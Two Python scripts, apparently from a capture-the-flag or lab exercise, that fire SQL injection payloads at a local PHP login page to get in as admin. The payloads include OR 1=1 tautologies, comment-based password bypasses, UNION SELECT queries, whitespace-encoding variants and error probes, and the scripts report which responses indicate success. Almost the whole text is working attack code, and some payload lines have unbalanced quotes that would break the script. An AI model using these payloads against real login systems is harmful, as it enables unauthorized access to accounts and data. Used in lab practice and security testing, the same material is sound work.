import requests
import urllib.parse

url = "http://127.0.0.1:32960/index.php"

print("=== Trying More Payload Variations ===\n")

# Try payloads without quotes (numeric context)
numeric_payloads = [
    ("1", " OR 1=1"),
    ("0", " OR 1=1"),
    ("1 OR 1=1", "any"),
    ("0 OR 1=1", "any"),
    ("999", " OR 1=1"),  # High number
]

print("Numeric injection tests:")
for user, pwd in numeric_payloads:
    resp = requests.get(url, params={'username': user, 'password': pwd})
    has_fail = 'not the admin' in resp.text.lower()
    print(f"  User='{user}' Pass='{pwd}' | Failed: {has_fail}")
    if not has_fail:
        print(f"    [!] SUCCESS! Response:\n{resp.text}")

# Try different character sets
print("\nCase and charset variations:")
variant_payloads = [
    ("ADMIN' OR '1'='1", "any"),  # All caps
    ("Admin' Or '1'='1", "any"),  # Mixed case
    ("admin' oR '1'='1", "any"),
]

for user, pwd in variant_payloads:
    resp = requests.get(url, params={'username': user, 'password': pwd})
    has_fail = 'not the admin' in resp.text.lower()
    print(f"  User='{user}' | Failed: {has_fail}")
    if not has_fail:
        print(f"    [!] SUCCESS!\n{resp.text}")

# Try with spaces encoded differently
print("\nDifferent space encoding:")
space_variants = [
    "admin'+OR+'1'='1",  # Plus for space
    "admin'%20OR%20'1'='1",  # URL encoded space
    "admin'/**/OR/**/'1'='1",  # Comment as space
    "admin'%09OR%09'1'='1",  # Tab
]

for payload in space_variants:
    resp = requests.get(url, params={'username': payload, 'password': 'x'})
    has_fail = 'not the admin' in resp.text.lower()
    print(f"  '{payload[:40]}' | Failed: {has_fail}")
    if not has_fail:
        print(f"    [!] SUCCESS!\n{resp.text}")

print("\n=== Testing Logical Operators ===")
# Test boolean logic more directly
logic_tests = [
    # Ensure admin is selected
    ("' OR username='admin", "any"),
    ("' OR username LIKE 'admin", "any"),
    ("' OR user='admin", "any"),
    ("admin' AND 1=1", "x"),
    ("admin' AND TRUE", "x"),
]

for user, pwd in logic_tests:
    resp = requests.get(url, params={'username': user, 'password': pwd})
    has_fail = 'not the admin' in resp.text.lower()
    print(f"  '{user}' | Failed: {has_fail}")
    if not has_fail:
        print(f"    [!] SUCCESS!\n{resp.text}")

print("\n=== Trying Short-circuit evaluation ===")
# If query structure is: WHERE (condition1) AND (condition2)
# We want to make condition1 true for admin
short_circuit = [
    ("(admin='admin') OR 1=1", "any"),  # Weird syntax but worth trying
    ("admin') OR 1=1 LIMIT 1 --", "any"),
    ("admin') OR ('a'='a")", "any"),
]

for user, pwd in short_circuit:
    resp = requests.get(url, params={'username': user, 'password': pwd})
    has_fail = 'not the admin' in resp.text.lower()
    print(f"  '{user}' | Failed: {has_fail}")
    if not has_fail:
        print(f"    [!] SUCCESS!\n{resp.text}")

print("\n=== Final check - Difference between empty and valid login ===")
# Compare responses character by character to understand structure better
resp_empty = requests.get(url)
resp_with_params = requests.get(url, params={'username': 'test', 'password': 'test'})
resp_sqli = requests.get(url, params={'username': "admin' OR '1'='1", 'password': 'x'})

# Print the h3 content
import re
for name, resp in [("Empty", resp_empty), ("With params", resp_with_params), ("SQLi", resp_sqli)]:
    match = re.search(r'<h3>(.*?)</h3>', resp.text, re.DOTALL)
    msg = match.group(1) if match else "NO H3 TAG"
    print(f"{name}: {msg}")

import requests

url = "http://127.0.0.1:32960/index.php"

print("=== Careful Analysis of Response Patterns ===\n")

# Baseline: NO h3 message (no parameters)
resp_no_params = requests.get(url)
print(f"[No params]           Length: {len(resp_no_params.text)} | Has h3: {'<h3>' in resp_no_params.text}")

# Baseline: h3 message (any parameters including SQLi)
resp_sqli = requests.get(url, params={'username': "admin' OR '1'='1", 'password': 'x'})
print(f"[SQLi payload]        Length: {len(resp_sqli.text)} | Has h3: {'<h3>' in resp_sqli.text}")

# The h3 message is the indicator
# No h3 = not authenticated
# Has h3 with 'not admin' = authenticated but wrong user
# The goal: Has h3 WITHOUT 'not admin' message (success!)

print("\n=== Testing Payloads That Specifically Select Admin ===\n")

# Try to return only admin row
admin_specific = [
    ("' UNION SELECT * FROM users WHERE username='admin' --", "any"),
    ("' AND 1=0 UNION SELECT * FROM users WHERE username='admin"", "any"),
    ("admin' LIMIT 1 --", "any"),
    ("admin' ORDER BY username LIMIT 1 --", "any"),
]

print("Testing admin-specific selection:")
for user, pwd in admin_specific:
    try:
        resp = requests.get(url, params={'username': user, 'password': pwd})
        has_h3 = '<h3>' in resp.text
        is_not_admin = 'not the admin' in resp.text.lower() if has_h3 else False
        print(f"  '{user[:40]}'")
        print(f"    Has h3: {has_h3} | 'Not admin' msg: {is_not_admin} | Length: {len(resp.text)}")
        if has_h3 and not is_not_admin:
            print(f"    [!] SUCCESS! Response:\n{resp.text}")
    except Exception as e:
        print(f"  Error: {e}")

print("\n=== Testing Comment Variations for Password Bypass ===\n")

# In PHP/MySQL: SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
# To bypass: admin' --  (comments out password check)
comment_payloads = [
    ("admin' --", "anything"),
    ("admin' #", "anything"),
    ("admin'--", "anything"),
    ("admin'#", "anything"),
    ("admin' /*", "anything"),
    ("admin'-- -", "anything"),
    ("admin' -- -", "anything"),
]

print("Testing comment-based bypass:")
for user, pwd in comment_payloads:
    resp = requests.get(url, params={'username': user, 'password': pwd})
    has_h3 = '<h3>' in resp.text
    is_not_admin = 'not the admin' in resp.text.lower() if has_h3 else False
    print(f"  '{user}' | Has h3: {has_h3} | Not admin: {is_not_admin}")
    if has_h3 and not is_not_admin:
        print(f"    [!] SUCCESS!\n{resp.text}")

print("\n=== Testing Error-based Detection ===")

# Try to cause syntax errors to understand query structure
error_payloads = [
    "'",  # Single quote
    "''", # Two quotes
    "' OR 1", # Incomplete OR
    "admin'", # Truncated
    "1' AND 1=1", # Mixed
]

print("Testing error patterns:")
for payload in error_payloads:
    resp = requests.get(url, params={'username': payload, 'password': 'x'})
    has_h3 = '<h3>' in resp.text
    has_error = 'error' in resp.text.lower()
    print(f"  '{payload}' | Has h3: {has_h3} | Has error: {has_error} | Len: {len(resp.text)}")

